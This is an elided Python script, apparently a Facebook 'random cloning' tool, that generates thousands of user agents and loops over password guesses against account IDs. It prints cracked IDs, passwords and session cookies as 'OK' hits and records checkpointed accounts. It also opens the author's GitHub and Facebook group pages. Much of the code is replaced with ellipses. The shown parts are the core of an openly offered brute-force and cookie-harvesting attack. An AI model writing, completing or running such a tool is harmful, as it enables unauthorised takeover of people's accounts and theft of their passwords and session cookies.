#Create By: RONY_RUBA
#FaceBook: RONY RUBA
#GitHub: https://github.com/princeshahin/Random_Cloning
#---------------------------------------------------------------------------#
...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/princeshahin/Random-BD')
logo = (""" /$$$$$$$   /$$$$$$  /$$   /$$ /$$     /$$      /$$$$$$$ 
| $$__  $$ /$$__  $$| $$$ | $$|  $$   /$$/     | $$__  $$
| $$  \ $$| $$  \ $$| $$$$| $$ \  $$ /$$/      | $$  \ $$
| $$$$$$$/| $$  | $$| $$ $$ $$  \  $$$$//$$$$$$| $$$$$$$/
...
\033[1;31m[\033[1;32m®\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m                  √ \x1b[38;5;46mMohammad Rony
\033[1;31m[\033[1;32m®\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m                  √ \x1b[38;5;46mRony Ruba
...
\033[1;31m[\033[1;32m®\033[1;31m]  \x1b[38;5;46mStatus\033[1;31m                      √ \x1b[38;5;46mFree
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Rony=input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/groups/king.old/?ref=share')
        if Rony in ["1", "01"]:
            num()
        if Rony in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRONY\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[RONY-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RUBA-CP] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RONY-XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()